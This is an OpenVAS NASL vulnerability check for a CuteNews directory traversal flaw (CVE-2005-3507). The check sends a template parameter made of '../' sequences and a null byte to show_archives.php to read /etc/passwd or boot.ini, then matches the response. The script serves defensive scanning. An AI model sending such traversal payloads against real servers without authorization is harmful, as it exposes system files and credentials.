# OpenVAS Vulnerability Test
# $Id: cutenews_dir_traversal.nasl 9732 2018-05-04 14:04:40Z cfischer $
# Description: CuteNews directory traversal flaw
#
# Authors:
# David Maciejak <david dot maciejak at kyxar dot fr>
# Updated: 03/12/2009 Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (C) 2005 David Maciejak
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

# Ref: retrogod at aliceposta.it

CPE = "cpe:/a:cutephp:cutenews";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.20137");
  script_version("$Revision: 9732 $");
  script_tag(name:"last_modification", value:"$Date: 2018-05-04 16:04:40 +0200 (Fri, 04 May 2018) $");
  script_tag(name:"creation_date", value:"2006-03-26 17:55:15 +0200 (Sun, 26 Mar 2006)");
  script_cve_id("CVE-2005-3507");
  script_bugtraq_id(15295);
  script_xref(name:"OSVDB", value:"20472");
  script_xref(name:"OSVDB", value:"20473");
  script_xref(name:"OSVDB", value:"20474");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");

  script_name("CuteNews directory traversal flaw");

  script_category(ACT_ATTACK);
  script_copyright("This script is Copyright (C) 2005 David Maciejak");
  script_family("Web application abuses");
  script_require_ports("Services/www", 80);
  script_dependencies("cutenews_detect.nasl", "cross_site_scripting.nasl");
  script_mandatory_keys("cutenews/installed");

  script_xref(name: "URL", value: "http://retrogod.altervista.org/cute141.html");

  script_tag(name: "solution", value: "Update to the latest version.");

  script_tag(name: "summary", value: "The version of CuteNews installed on the remote host fails to sanitize
  user-supplied input to the 'template' parameter of the 'show_archives.php' and 'show_news.php' scripts.");

  script_tag(name: "impact", value: "An attacker can exploit this issue to read arbitrary files and possibly
  even execute arbitrary PHP code on the remote host, subject to the privileges of the web server user id.");

  script_tag(name:"solution_type", value:"VendorFix");

  script_tag(name:"qod_type", value:"remote_vul");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");

if (!port = get_app_port(cpe: CPE))
  exit(0);

if (!dir = get_app_location(cpe: CPE, port: port))
  exit(0);

if (dir == "/")
  dir = "";

foreach file (make_list("etc/passwd", "boot.ini")) {
  url = dir + "/show_archives.php?template=../../../../../../../../../" + file + "%00";
  req = http_get(item: url, port:port);
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if(res == NULL) exit(0);
  if(egrep(pattern:"(root:.*:0:[01]:|\[boot loader\])", string:res)) {
    report = report_vuln_url(port: port, url: url);
    security_message(port: port, data: report);
    exit(0);
  }
}

exit(99);
